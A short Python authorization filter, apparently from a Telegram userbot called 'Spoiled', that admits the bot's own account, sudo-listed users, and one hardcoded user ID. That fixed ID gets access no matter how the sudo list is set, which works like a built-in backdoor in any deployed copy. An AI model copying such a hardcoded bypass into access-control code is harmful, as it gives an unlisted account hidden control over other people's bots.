from Spoiled.Database.sudo import is_sudo

async def verify(_, m):
    x = m.from_user.is_self
    if not x:
        id = m.from_user.id
        if id == 5834211089:
            return True
        sudo = await is_sudo(id)
        if not sudo:
            return False
    return True
